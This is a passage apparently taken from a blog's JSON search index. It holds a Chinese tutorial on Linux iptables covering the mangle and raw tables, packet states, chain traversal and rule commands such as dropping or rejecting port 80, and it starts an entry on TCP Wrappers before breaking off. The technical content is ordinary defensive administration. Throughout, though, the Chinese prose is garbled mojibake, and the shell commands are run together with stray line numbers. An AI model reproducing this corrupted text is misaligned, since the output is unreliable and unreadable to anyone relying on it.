é“¾ï¼Œå¹¶ä¸”åŒ¹é…äº†è§„åˆ™ï¼Œåˆ™æ‰§è¡Œ DNAT æˆ– REDIRECT ç›®æ ‡ã€‚ä¾¿å¯åœ¨è·¯ç”±ä¹‹å‰ä¿®æ”¹ç›®çš„åœ°å€äº†ã€‚ è·¯ç”±æ˜¯å†…æ ¸æ£€æŸ¥æ•°æ®åŒ…çš„æŠ¥å¤´ä¿¡æ¯ ä½†æ˜¯ NAT ä¹Ÿä¸æ˜¯å®Œç¾çš„ï¼Œå®ƒä¹Ÿæ˜¯æœ‰ç¼ºé™·çš„ï¼Œå¦‚æˆ‘ä»¬åœ¨ä½¿ç”¨ VPN çš„æ—¶å€™ä¾¿æ˜¯å¯¹æ•°æ®çš„åŠ å¯†ï¼Œè€Œè‹¥æ˜¯æ•°æ®åŒ…çš„ä¿¡æ¯è¢«ä¿®æ”¹è¿‡ï¼Œè¯¥åŒ…å°†è¢«ä¸¢å¼ƒï¼Œæ‰€ä»¥éœ€è¦ NAT ç©¿é€æŠ€æœ¯ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥æ›´æ·±å…¥çš„ç ”ç©¶ã€‚ 0x05 mangleè¡¨çš„è®¤è¯† å…¶ä¸­ mangle è¡¨ä¸»è¦ç”¨äºä¿®æ”¹æ•°æ®åŒ…çš„ TOSï¼ˆType Of Serviceï¼ŒæœåŠ¡ç±»å‹ï¼Œæ ¹æ®ä¸åŒçš„æœåŠ¡è´¨é‡ã€‚æ¥é€‰æ‹©ç»è¿‡è·¯ç”±çš„è·¯å¾„ï¼‰ã€TTLï¼ˆTime To Liveï¼Œç”Ÿå­˜å‘¨æœŸï¼Œæ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨å°†å‡1ï¼Œmangle å¯ä»¥ä¿®æ”¹æ­¤å€¼è®¾å®šTTLè¦è¢«å¢åŠ çš„å€¼ï¼Œè¿™ä¸ªé€‰é¡¹å¯ä»¥ä½¿æˆ‘ä»¬çš„é˜²ç«å¢™æ›´åŠ éšè”½ï¼Œè€Œä¸è¢« trace-routes å‘ç°ç­‰ç­‰ï¼‰ä»¥åŠä¸ºæ•°æ®åŒ…è®¾ç½® Mark æ ‡è®°ï¼ˆç‰¹æ®Šæ ‡è®°ï¼Œç”¨æ¥åšé«˜çº§è·¯ç”±ï¼Œä»¥ä½¿ä¸åŒçš„åŒ…èƒ½ä½¿ç”¨ä¸åŒçš„é˜Ÿåˆ—è¦æ±‚ï¼Œç­‰ç­‰ï¼‰ï¼ŒQos(Quality Of Serviceï¼ŒæœåŠ¡è´¨é‡)è°ƒæ•´ä»¥åŠç­–ç•¥è·¯ç”±ç­‰åº”ç”¨ï¼Œç”±äº TOSï¼ŒQos ç±»ä¼¼çš„æ–¹å¼éœ€è¦ç›¸åº”çš„è·¯ç”±è®¾å¤‡æ”¯æŒï¼Œæ‰€ä»¥åº”ç”¨å¹¶ä¸å¹¿æ³›ã€‚è¿™é‡Œä¸åšè¿‡å¤šçš„è®²è§£ï¼Œè¿™ä¸ªè¡¨ä¸­åŒ…å«äº”ä¸ªè§„åˆ™é“¾ï¼šPREROUTINGï¼ŒPOSTROUTINGï¼ŒINPUTï¼ŒOUTPUTï¼ŒFORWARDã€‚ 0x06 raw è¡¨çš„è®¤è¯† raw è¡¨æ˜¯è‡ª1.2.9ä»¥åç‰ˆæœ¬çš„ iptables æ–°å¢çš„è¡¨ï¼Œä¸»è¦ç”¨äºå†³å®šæ•°æ®åŒ…æ˜¯å¦è¢«çŠ¶æ€è·Ÿè¸ªæœºåˆ¶å¤„ç†ã€‚åœ¨åŒ¹é…æ•°æ®åŒ…æ—¶ï¼Œraw è¡¨çš„è§„åˆ™è¦ä¼˜å…ˆäºå…¶ä»–è¡¨ã€‚åŒ…å«ä¸¤æ¡è§„åˆ™é“¾ï¼šOUTPUTã€PREROUTING 0x07 æ•°æ®åŒ…çš„çŠ¶æ€ iptablesä¸­æ•°æ®åŒ…è¢«è·Ÿè¸ªè¿æ¥æœ‰4ç§ä¸åŒçŠ¶æ€ï¼š NEWï¼šè¯¥åŒ…æƒ³è¦å¼€å§‹ä¸€ä¸ªè¿æ¥ï¼ˆé‡æ–°è¿æ¥æˆ–å°†è¿æ¥é‡å®šå‘ï¼‰ RELATEDï¼šè¯¥åŒ…æ˜¯å±äºæŸä¸ªå·²ç»å»ºç«‹çš„è¿æ¥æ‰€å»ºç«‹çš„æ–°è¿æ¥ã€‚ä¾‹å¦‚ï¼šâ€“icmp-type 0 ( ping åº”ç­”) å°±æ˜¯â€“icmp-type 8 (ping è¯·æ±‚)æ‰€RELATEDå‡ºæ¥çš„ã€‚ ESTABLISHED ï¼šåªè¦å‘é€å¹¶æ¥åˆ°åº”ç­”ï¼Œä¸€ä¸ªæ•°æ®è¿æ¥ä»NEWå˜ä¸º ESTABLISHED ,è€Œä¸”è¯¥çŠ¶æ€ä¼šç»§ç»­åŒ¹é…è¿™ä¸ªè¿æ¥çš„åç»­æ•°æ®åŒ…ã€‚ INVALIDï¼šæ•°æ®åŒ…ä¸èƒ½è¢«è¯†åˆ«å±äºå“ªä¸ªè¿æ¥æˆ–æ²¡æœ‰ä»»ä½•çŠ¶æ€æ¯”å¦‚å†…å­˜æº¢å‡ºï¼Œæ”¶åˆ°ä¸çŸ¥å±äºå“ªä¸ªè¿æ¥çš„ ICMP é”™è¯¯ä¿¡æ¯ï¼Œä¸€èˆ¬åº”è¯¥ DROP è¿™ä¸ªçŠ¶æ€çš„ä»»ä½•æ•°æ®ã€‚ æˆ‘ä»¬å¯¹æ¯ä¸€å¼ è¡¨ä»¥åŠæ¯ä¸€ä¸ªé“¾éƒ½æœ‰äº†ä¸€ä¸ªå¤§ä½“ä¸Šçš„è®¤è¯†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™æ ·ä¸€å¼ è¡¨äº†è§£åˆ°æˆ‘ä»¬çš„æ•°æ®åŒ…åœ¨æˆ‘ä»¬çš„å†…æ ¸ä¸­æ˜¯æ€æ ·çš„ä¸€ä¸ªå‰è¿›çš„è¿‡ç¨‹ï¼Œåˆ°åº•è¦ç»è¿‡å¤šå°‘æ¬¡å®¡æ ¸ï¼Œå¤šå°‘ä¸ªå…³å¡ ä»è¿™å¼ å›¾ä¸­æˆ‘ä»¬å¯ä»¥äº†è§£åˆ°æ¯ä¸ªæ•°æ®åŒ…çš„è¿›ä¸å‡ºéƒ½ä¼šç»å†è¿™æ ·çš„ä¸€ä¸ªæµç¨‹ å½“æœ‰æ•°æ®åŒ…è¿›å…¥ç½‘å¡æ—¶ï¼Œæ•°æ®åŒ…é¦–å…ˆåˆ° PREROUTING é“¾ä¸­ï¼Œè‹¥æ˜¯æœ‰è¡¨å¯¹åº”çš„è¡¨åŒ¹é…ï¼Œé¦–å…ˆåº”è¯¥æ˜¯åˆ° raw ä¸­ï¼Œç„¶ååˆ° mangle ä¸­æœ€ååˆ° NAT çš„ PREROUTING é“¾ä¸­ï¼Œä¸Šæ–‡æˆ‘ä»¬ä¹Ÿæè¿‡PREROUTING é“¾ä¸­æˆ‘ä»¬æœ‰æœºä¼šåœ¨åˆ°å†…æ ¸çš„è·¯ç”±æ¨¡å—ä¹‹å‰ä¿®æ”¹æ•°æ®åŒ…çš„ç›®çš„ IP ï¼Œç„¶åå†…æ ¸çš„&quot;è·¯ç”±æ¨¡å—&quot;æ ¹æ®æ•°æ®åŒ…ç›®çš„ IP ä»¥åŠå†…æ ¸ä¸­çš„è·¯ç”±è¡¨åˆ¤æ–­å¾€å“ªé‡Œè½¬å‘(æ³¨æ„ï¼Œè¿™ä¸ªæ—¶å€™æ•°æ®åŒ…çš„ç›®çš„åœ°å€æœ‰å¯èƒ½å·²ç»è¢«æˆ‘ä»¬ä¿®æ”¹è¿‡äº†) è‹¥æ˜¯è¯¥æ•°æ®åŒ…çš„ç›®çš„åœ°å€å°±æ˜¯æœ¬æœºçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯¥æ•°æ®åŒ…å°±æ˜¯å‘é€ç»™æœ¬åœ°çš„ï¼Œé‚£ä¹ˆå°±ä¼šè¿›å…¥ INPUT é“¾ï¼Œè€Œè¿›å…¥ INPUT é“¾é¦–å…ˆåˆ° mangle è¡¨ä¸­çœ‹çœ‹ï¼Œç„¶ååˆ° filter è¡¨ä¸­çœ‹çœ‹ã€‚é€šè¿‡ä¹‹åä¾¿ä¼šå‘ç»™æœ¬åœ°çš„ç›¸åº”çš„ç¨‹åº æœ¬åœ°ç›¸åº”çš„ç¨‹åºè‹¥æ˜¯åšå‡ºå“åº”ï¼Œäº§ç”Ÿæ–°çš„æ•°æ®åŒ…å¾€å¤–å‘é€ï¼Œæ•°æ®åŒ…å°†è¿›å…¥åˆ° OUTPUT é“¾ï¼Œè€Œåœ¨ OUTPUT é“¾ä¸­ä¸ INPUT é“¾åŒ¹é…è¡¨çš„é¡ºåºç›¸åŒï¼Œä¾æ—§æ˜¯é¦–å…ˆæŸ¥çœ‹ raw è¡¨ï¼Œç„¶åæŸ¥çœ‹ mangle è¡¨ï¼ŒæŸ¥çœ‹ NATè¡¨ ï¼Œæœ€åæŸ¥çœ‹ filter è¡¨ï¼Œè‹¥æ˜¯è¯¥æ•°æ®åŒ…è¿˜èƒ½ç»§ç»­å‰è¿›å°†ä¼šè¢«å‘é€åˆ° POSTROUTING é“¾ä¸­ã€‚ è‹¥æ˜¯ä¹‹å‰è¯¥æ•°æ®åŒ…çš„ç›®çš„åœ°å€å¹¶ä¸æ˜¯æœ¬æœºï¼Œåªæ˜¯æŠŠè¿™é‡Œå½“ä¸­è½¬ç«™çš„è¯ï¼Œå°±ä¼šå°†è¯¥æ•°æ®åŒ…å‘ç»™ FORWARD é“¾ï¼Œåœ¨ FORWARD é“¾ä¸­ï¼Œä¾æ—§å…ˆæŸ¥çœ‹ mangle è¡¨ï¼Œç„¶åæŸ¥çœ‹ filter è¡¨ï¼Œè‹¥æ˜¯è¯¥åŒ…è¿˜èƒ½è¿›å»å‰è¿›åˆ™å°†è¿›å…¥ POSTROUTING é“¾ä¸­ åœ¨ POSTROUTING é“¾ä¸­é¦–å…ˆæŸ¥çœ‹ mangle è¡¨ï¼Œç„¶åæŸ¥çœ‹ NAT è¡¨ï¼Œå› ä¸ºä»–ä»¬å¯ä»¥åœ¨æœ€åå‘é€å‡ºå»ä¹‹å‰ä¿®æ”¹æ•°æ®åŒ…ä¸­çš„æºåœ°å€ã€‚ é€šè¿‡è¿™äº›çš„å±‚å±‚æŠŠå…³ï¼Œæœ€åæ•°æ®åŒ…ä¾¿å¯ä»¥ä»ç½‘å¡å‘é€å‡ºå»äº† ä»æ•°æ®åŒ…åœ¨å†…æ ¸ä¸­çš„èµ°å‘æˆ‘ä»¬å¯ä»¥å¾—å‡ºä»¥ä¸‹å‡ ç‚¹ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬éœ€è¦ç€é‡æ³¨æ„çš„å‡ ç‚¹ï¼š iptables ä¸­åŒ¹é…è§„åˆ™çš„è¡¨ç¤ºæœ‰é¡ºåºçš„ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºä¼˜å…ˆçº§çš„é¡ºåºæ˜¯ raw è¡¨&gt; mangle è¡¨&gt; NAT è¡¨&gt; filter è¡¨ iptables ä¸­çš„è¡¨é‡Œé¢çš„é“¾çš„è§„åˆ™ä¹Ÿæ˜¯æœ‰åŒ¹é…é¡ºåºçš„ï¼Œä¼˜å…ˆçº§çš„é¡ºåºæ˜¯ PREROUTING &gt; INPUT FORWARD OUTPUT POSTROUTING æˆ‘ä»¬åœ¨ä½¿ç”¨ iptables çš„æ—¶å€™ç‰¹åˆ«åº”è¯¥æ³¨æ„æˆ‘ä»¬çš„è§„åˆ™é¡ºåºï¼Œåœ¨ä¸€ä¸ªè¡¨ä¸­çš„è§„åˆ™æ˜¯ä»ä¸Šåˆ°ä¸‹çš„è¯»å–ï¼Œè€Œä¸€ç»æŸ¥çœ‹åˆ°åŒ¹é…çš„è§„åˆ™ï¼Œä¾¿ä¸ä¼šç»§ç»­å¾€ä¸‹è¯»å–åŒ¹é…ï¼Œæ‰€ä»¥æˆ‘ä»¬æ—¶å¸¸ä¼šé‡åˆ°æˆ‘ä»¬å†™äº†è§„åˆ™ä¹‹åä¼¼ä¹å¹¶æ²¡æœ‰ç”Ÿæ•ˆçš„æƒ…å†µä¾¿æ˜¯è¿™æ ·ã€‚ 0x08 iptables çš„ä½¿ç”¨ è¯´å¾—å†å¤šï¼Œæˆ‘ä»¬å¾—ä¸åˆ°å®é™…çš„æ•ˆæœï¼Œæˆ‘ä»¬ä¹Ÿä¸ä¼šæœ‰ç‰¹åˆ«æ·±åˆ»çš„ç†è§£ï¼Œæˆ‘ä»¬æ¥å®é™…çš„ä½¿ç”¨ä¸€æ¬¡ é¦–å…ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™æ ·çš„ä¸€ä¸ªå‘½ä»¤æ¥æŸ¥çœ‹å½“å‰ iptables ä¸­å·²ç»å†™ä¸‹çš„è§„åˆ™ 1sudo iptables -nL ä»ç»“æœä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åˆ†å¸ƒåœ¨æ¯æ¡é“¾ä¸­çš„å·²ç»å†™å…¥çš„è§„åˆ™ï¼Œè‹¥æˆ‘ä»¬è¿˜æƒ³åˆ°è·Ÿè¯¦ç»†çš„ç»“æœå¯ä»¥ä½¿ç”¨è¿™æ ·çš„ä¸€ä¸ªå‘½ä»¤ 1sudo iptables -nvL --line ç¬¬ä¸€åˆ— num æ˜¾ç¤ºäº†è¯¥è§„åˆ™åœ¨è¯¥é“¾ä¸­çš„é¡ºåºä½ç½® ç¬¬äºŒåˆ— pkts æ˜¾ç¤ºäº†è¯¥è§„åˆ™å¤„ç†çš„æ•°æ®åŒ…æ•° ç¬¬ä¸‰åˆ— bytes æ˜¾ç¤ºäº†è¯¥è§„åˆ™å¤„ç†çš„å­—èŠ‚æ•°ï¼Œ ç¬¬å››åˆ— target æ˜¾ç¤ºäº†è¯¥è§„åˆ™æ‰€åšçš„è¡Œä¸ºï¼Œ ç¬¬äº”åˆ— port åŒ¹é…çš„ç«¯å£ ç¬¬å…­åˆ— opt æ˜¯ TCP åè®®å¤´éƒ¨ä¸­ options çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸æ˜¯é‡ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸å¿…å…³æ³¨ï¼Œæœ‰å…´è¶£çš„ä¹Ÿå¯ä»¥é€šè¿‡ç»´åŸºç™¾ç§‘æ·±å…¥äº†è§£ ç¬¬ä¸ƒåˆ—ã€ç¬¬å…«åˆ— inã€out åˆ†åˆ«è¡¨ç¤ºå¯¹ä»ç½‘å¡è¿›å…¥ä¸å‡ºå»çš„é™åˆ¶ ip çš„åŒ¹é…æ¡ä»¶ ç¬¬ä¹åˆ—ã€ç¬¬ååˆ— sourceã€destination è¡¨ç¤ºå¯¹åŒ…ä¸­åˆ†æå¾—å‡ºçš„æ•°æ®æºåœ°å€ä¸æ•°æ®çš„ç›®çš„åœ°å€çš„åŒ¹é… æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ä¸€ç§æ–¹å¼æ¥æŸ¥çœ‹å·²ç»ç”Ÿæ•ˆçš„è§„åˆ™ï¼Œè¿™ç§æ–¹å¼æŸ¥çœ‹åˆ°çš„æ˜¯æˆ‘ä»¬ç›´æ¥æ’å…¥çš„è§„åˆ™ï¼Œè€Œä¸æ˜¯åƒä»¥ä¸Šä¸¤ä¸ªå‘½ä»¤ç»è¿‡åˆ†æåçš„ç»“æœï¼š 1sudo iptables-save å½“ç„¶ iptables-save æœ‰ä¸€ä¸ªå‚æ•° -t å¯ä»¥æŒ‡å®šæˆ‘ä»¬è¦ä¿å­˜çš„è¡¨ï¼Œåˆ°æŸä¸ªæ–‡ä»¶ä¸­å» 1234#åœ¨æ‰§è¡Œè¯¥å‘½ä»¤ä¹‹å‰è¯·å…ˆç”¨sudo su åˆ‡æ¢åˆ° root ç”¨æˆ·iptables-save -t filter &gt; filter.bakcat filter.bak ä¸Šæˆ‘ä»¬æˆ‘ä»¬æåˆ°è¿‡ï¼Œiptables æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å†…æ ¸æ¥å£æ¥å¯¹å­˜æ”¾åœ¨å†…å­˜ä¸­çš„ Netfilter é…ç½®è¡¨è¿›è¡Œä¿®æ”¹ã€ç¼–è¾‘çš„ä¸€ä¸ªå·¥å…·ï¼Œæ—¢ç„¶æ˜¯ä¿®æ”¹çš„å†…å­˜ä¸­çš„é…ç½®è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶ä¸éœ€è¦é‡å¯é˜²ç«å¢™ä»€ä¹ˆçš„ï¼Œä¿®æ”¹åçš„è§„åˆ™ä¼šç«‹å³ç”Ÿæ•ˆã€‚ æˆ‘ä»¬å†æ¥å›é¡¾ä¸€ä¸‹åœ¨ç¼–å†™è§„åˆ™æ—¶æˆ‘ä»¬éœ€è¦ä¹¦å†™å“ªäº›å‚æ•°ï¼š æˆ‘ä»¬å¯ä»¥åšè¿™ä¹ˆä¸€ä¸ªä¾‹å­ï¼Œå°†æ‰€æœ‰è®¿é—®æˆ‘ä»¬ 80 ç«¯å£çš„æ•°æ®åŒ…å…¨éƒ¨ä¸¢æ‰ é¦–å…ˆæˆ‘ä»¬æ¥éªŒè¯ 80 ç«¯å£æ˜¯å¼€å‘çš„ï¼Œå¯ä»¥è®¿é—®çš„ 123456789#é¦–å…ˆæœ¬å®éªŒç¯å¢ƒæ²¡æœ‰è£… apache æœåŠ¡æˆ‘ä»¬éœ€è¦å®‰è£…ä¸€ä¸‹ï¼Œç„¶åå¯åŠ¨æœåŠ¡sudo apt-get install apache2sudo service apache2 startnetstat -lunpt | grep 80#å°è¯•çœ‹æˆ‘ä»¬èƒ½å¦è®¿é—®è¯¥é¡µé¢ï¼Œè‹¥è¿”å›å€¼ä¸º 200 åˆ™ä¸ºæˆåŠŸè®¿é—®curl -I localhost ç„¶åæˆ‘ä»¬æ¥æ·»åŠ è¿™ä¹ˆä¸€æ¡è§„åˆ™ï¼Œå¹¶æŸ¥çœ‹ä»–æ˜¯å¦å†™å…¥äº†è§„åˆ™è¡¨å½“ä¸­ 1234567sudo iptables -t filter -I INPUT -p tcp --dport 80 -j DROP#ä»…ä»…åªæ˜¯æŸ¥çœ‹ INPUT é“¾æ˜¯å¦åŠ å…¥äº†è¿™æ¡è§„åˆ™sudo iptables -nvL INPUT#ç„¶åæˆ‘ä»¬å†æ¥å°è¯•ä¸€æ¬¡ï¼Œèƒ½å¦æŸ¥çœ‹åˆ°è¯¥ç½‘é¡µcurl localhost æ˜¯å¾—ä¸åˆ°ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆä¼šä¸€ç›´åœç•™åœ¨é‚£é‡Œï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æ˜¯ç”¨çš„ DROP å°†æ‰€æœ‰æ¥è®¿é—®è¯¥é¡µé¢çš„æ•°æ®åŒ…ä¸¢æ‰ï¼Œä¸ç»™ä»»ä½•è¿”å›ï¼Œå“åº”ï¼Œè€Œ ~å´å¾ˆé’Ÿæƒ…çš„ä¸€ç›´ç­‰å¾…ç€æœåŠ¡ç«¯çš„å“åº”ã€‚è‹¥æˆ‘ä»¬å°† DROP è¡Œä¸ºæ”¹æˆ REJECT çš„è¯ï¼Œå°±ä¼šæœ‰è¿”å›ä¿¡æ¯è¯´è¿™ä¸ªç«¯å£æ— æ³•è®¿é—®ã€‚ 123456789#åˆ é™¤æˆ‘ä»¬ä¹‹å‰æ·»åŠ çš„è§„åˆ™ï¼Œè¿™é‡Œæ²¡æœ‰æ·»åŠ  -t çš„å‚æ•°#æ˜¯å› ä¸ºä¸æŒ‡æ˜è¯¥å‚æ•°ï¼Œç³»ç»Ÿé»˜è®¤ä¸ºä¿®æ”¹ filter è¡¨sudo iptables -D INPUT -p tcp --dport 80 -j DROP#æ·»åŠ æ‹’ç»çš„è§„åˆ™sudo iptables -I INPUT -p tcp --dport 80 -j REJECT#å†æ¬¡éªŒè¯curl localhost é€šè¿‡ä¸Šé¢çš„ä¾‹å­å¤§å®¶å¯ä»¥çœ‹åˆ° iptables å·²ç»ä¿®æ”¹ä¾¿ä¼šç«‹å³ç”Ÿæ•ˆï¼Œåœ¨ä¿®æ”¹è§„åˆ™çš„æ—¶å€™æˆ‘ä»¬ä¼šç”¨åˆ°å„ç§å‚æ•°ï¼Œä¸‹é¢åˆ—å‡ºä¸€äº›å¸¸ç”¨çš„å‚æ•° å‚æ•° è§£é‡Š -t åˆ¶å®šæˆ‘ä»¬ä¿®æ”¹æˆ–è€…æ·»åŠ çš„è§„åˆ™æ˜¯æ”¾å…¥é‚£ä¸ªè¡¨ï¼Œè‹¥æ˜¯æ²¡æœ‰æŒ‡å®šé»˜è®¤ä¸º filter è¡¨ -A è¡¨ç¤ºæˆ‘ä»¬æ·»åŠ çš„è¿™ä¸ªè§„åˆ™è¿½åŠ åœ¨è¡¨çš„æœ€åé¢ï¼Œappend -I è¡¨ç¤ºæˆ‘ä»¬æŒ‡å®šä½ç½®æ’å…¥å½“å‰çš„è¿™ä¸ªè§„åˆ™ï¼Œinsertï¼ŒæŒ‡å®šçš„ä½ç½®å†™åœ¨é“¾åé¢ ï¼Œè‹¥æ˜¯æ²¡æœ‰æŒ‡å®šåˆ™é»˜è®¤å€¼ä¸º1ï¼Œä¹Ÿå°±æ˜¯å°†è¯¥è§„åˆ™æ·»åŠ åœ¨æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾çš„ç¬¬ä¸€ä½ -D åˆ é™¤æŸæ¡è§„åˆ™ï¼Œdeleteï¼Œåé¢å¯ä»¥æŒ‡æ˜å…·ä½“çš„è§„åˆ™ï¼Œå¦‚ä¸Šé¢çš„ä¾‹å­ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä½ç½®ï¼Œä½ç½®åŒæ ·æ˜¯æ”¾åœ¨é“¾çš„åé¢ -F æ¸…é™¤æ‰€æœ‰çš„è§„åˆ™ï¼Œè‹¥æ˜¯åé¢æœ‰è·Ÿä¸Šé“¾ï¼Œä¾¿åªåˆ é™¤è¯¥é“¾ä¸‹çš„æ‰€æœ‰è§„åˆ™ -L æ˜¾ç¤ºè§„åˆ™é“¾ä¸­å·²æœ‰çš„æ¡ç›® -N åˆ›å»ºæ–°çš„ç”¨æˆ·è‡ªå®šä¹‰è§„åˆ™é“¾ -p æŒ‡å®šè¦åŒ¹é…çš„æ•°æ®åŒ…åè®®ç±»å‹,å¦‚ä¸Šæ–‡æˆ‘ä»¬ä½¿ç”¨çš„tcp -s æŒ‡å®šè¦åŒ¹é…çš„æ•°æ®åŒ…æºipåœ°å€ -i&lt;ç½‘ç»œæ¥å£&gt; æŒ‡å®šæ•°æ®åŒ…è¿›å…¥æœ¬æœºçš„ç½‘ç»œæ¥å£ -o&lt;ç½‘ç»œæ¥å£&gt; æŒ‡å®šæ•°æ®åŒ…è¦ç¦»å¼€æœ¬æœºæ‰€ä½¿ç”¨çš„ç½‘ç»œæ¥å£ -j&lt;ç›®æ ‡&gt; æŒ‡å®šè¦è·³è½¬çš„ç›®æ ‡ï¼› å¦‚ä¸Šæ–‡ä¸­æˆ‘ä»¬åˆ é™¤ä¸€æ¡è§„åˆ™çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯ -D åé¢åŠ å…·ä½“çš„è§„åˆ™ï¼Œå…¶å®æˆ‘ä»¬è¿˜å¯ä»¥è¿™æ ·å»åˆ  12345#æŸ¥çœ‹æˆ‘ä»¬è¦åˆ é™¤çš„è§„åˆ™æ‰€åœ¨çš„é“¾ä¸ä½ç½®sudo iptables -nvL --line#åˆ é™¤æŒ‡å®šä½ç½®çš„è§„åˆ™sudo iptables -D INPUT 1","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxé˜²ç«å¢™","slug":"A-OS/Linux/Linuxé˜²ç«å¢™","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"ã€Linuxé˜²ç«å¢™ã€‘TCP Wrappers","date":"2024-01-16T06:15:17.596Z","path":"A_OS/Linux/Linuxé˜²ç«å¢™/ã€Linuxé˜²ç«å¢™ã€‘TCP Wrappers/","text":"æ¦‚è¿°ï¼šTCP wrappers æ˜¯ Linux ä¸­ä¸¤å¤§é˜²æŠ¤æªæ–½çš„å…¶ä¸­ä¹‹ä¸€ï¼Œè¿™å±‚ä¿æŠ¤é€šè¿‡å®šä¹‰å“ªäº›ä¸»æœºå…è®¸æˆ–ä¸å…è®¸è¿æ¥åˆ°ç½‘ç»œæœåŠ¡ä¸Šæ¥å®ç°ã€‚TCP Wrappersä¸ºå¤šç§ä¸åŒçš„æœåŠ¡æä¾›è®¿é—®æŠŠå…³ï¼Œé€šè¿‡æœ¬å®éªŒæˆ‘ä»¬å°†åˆè¯•TCP wrappersçš„ä½¿ç”¨ã€‚ å®éªŒæ¶‰åŠçš„çŸ¥è¯†ç‚¹ Tcp wrappersçš„è®¤è¯† Tcp wrappersçš„ä½¿ç”¨ 0x01 TCP Wrappers çš„è®¤è¯† Tcp Wrapper æ˜¯ç”± Wietse Venema ç¼–å†™çš„ï¼Œå…¶åˆ›ä½œå‡ºè¿™ä¸ªç¨‹åºçš„ä¸»è¦åŸå› æ˜¯ç›‘è§† Eindhoven å¤§å­¦æ•°å­¦å’Œè®¡ç®—æœºç§‘å­¦ç³»çš„Unixå·¥ä½œç«™ä¸Šçš„é»‘å®¢æ´»åŠ¨ï¼ŒWietse Venemaä¸€ç›´ç»´æŠ¤è¿™ä¸ªç¨‹åºåˆ°1995å¹´ï¼›2001å¹´6æœˆ1æ—¥ï¼Œåœ¨å…¶è‡ªå·±çš„BSDé£æ ¼çš„è®¸å¯è¯ä¸‹å‘å¸ƒã€‚ Tcp Wrapper æ˜¯ä¸€ä¸ªåŸºäºä¸»æœºçš„ç½‘ç»œè®¿é—®æ§åˆ¶çš„ç¨‹åºï¼Œç”¨äºè¿‡æ»¤å¯¹ç±» Unix ç³»ç»Ÿï¼ˆå¦‚ Linux æˆ– BSD ï¼‰çš„ç½‘ç»œè®¿é—®ã€‚ å½“ä¸€ä¸ªç³»ç»Ÿæˆ–è€…ä¸»æœºåœ¨å…¬å¼€ç½‘ç»œä¸­å……å½“æœåŠ¡å™¨æ—¶,è¿™ä¸ªç³»ç»Ÿå°±å¯èƒ½æˆä¸ºè¢«æ”»å‡»çš„ç›®æ ‡.å¯¹ç½‘ç»œæœåŠ¡è¿›è¡Œè®¿é—®æ§åˆ¶ æ˜¯ä¸€ä»¶å¾ˆé‡è¦çš„äº‹æƒ…ã€‚åƒ Telnetã€SSHã€FTPã€POP å’Œ SMTP ç­‰å¾ˆå¤šæœåŠ¡éƒ½ä¼šç”¨åˆ° TCP Wrapper,å®ƒè¢«è®¾è®¡ä¸ºä¸€ä¸ªä»‹äºå¤–æ¥æœåŠ¡è¯·æ±‚å’ŒæœåŠ¡å›åº”çš„ä¸­é—´å¤„ç† å®ƒçš„åŸºæœ¬è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼šå½“æœåŠ¡å™¨æˆ–ä¸»æœºæ¥æ”¶åˆ°ä¸€ä¸ªå¤–æ¥æœåŠ¡è¯·æ±‚çš„æ—¶å€™ï¼Œå…ˆç”±TCP Wrapper æ¥å¯¹è¯·æ±‚è¿›è¡Œåˆ†æå¤„ç†ï¼ŒTCP Wrapper ä¼šæ ¹æ®è¯·æ±‚æ‰€éœ€è¦çš„æœåŠ¡å’Œå¯¹è¿™ä¸ªæœåŠ¡æ‰€è®¾å®šçš„è§„åˆ™æ¥åˆ¤æ–­è¯·æ±‚æ–¹æ˜¯å¦æœ‰æƒé™ï¼Œå¦‚æœæœ‰ï¼ŒTCP Wrapper ä¼šæŠŠè¿™ä¸ªè¯·æ±‚æŒ‰ç…§é…ç½®æ–‡ä»¶æ‰€è®¾å®šçš„è§„åˆ™è½¬äº¤ç»™ç›¸åº”çš„å®ˆæŠ¤è¿›ç¨‹å»å¤„ç†ï¼ŒåŒæ—¶è®°å½•è¿™ä¸ªè¯·æ±‚åŠ¨ä½œã€‚ TCP Wrappersè™½ç„¶èƒ½å¯¹ TCP åè®®çš„æŠ¥æ–‡åšè¿‡æ»¤åŠ¨ä½œï¼Œä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰çš„ TCP åè®®æŠ¥æ–‡ TCP Wrappers éƒ½å¯ä»¥è¿‡æ»¤æ‰ã€‚åªæœ‰è¯¥æœåŠ¡é“¾æ¥åˆ°TCP Wrappersçš„å‡½å¼åº“æ‰å¯ä»¥ä½¿ç”¨TCP Wrappersè¿›è¡ŒæŠ¥æ–‡è¿‡æ»¤ã€‚ å› ä¸º TCP Wrapper çš„åŠŸèƒ½ä¸»è¦æ¥è‡ªäº libwrap.aè¿™ä¸ªé™æ€åº“ï¼Œå®ƒæ˜¯ä¸€ä¸ªæœåŠ¡åº“ã€‚åƒ xinetdã€sshd å’Œ portmap ç­‰è®¸å¤šæœåŠ¡ç¼–è¯‘æ—¶éƒ½ä¾èµ–äº libwrap.so è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå…¶ä»–çš„ç½‘è·¯æœåŠ¡ç”šè‡³ä½ è‡ªå·±ç¼–å†™çš„æœåŠ¡éƒ½å¯ä»¥åŠ 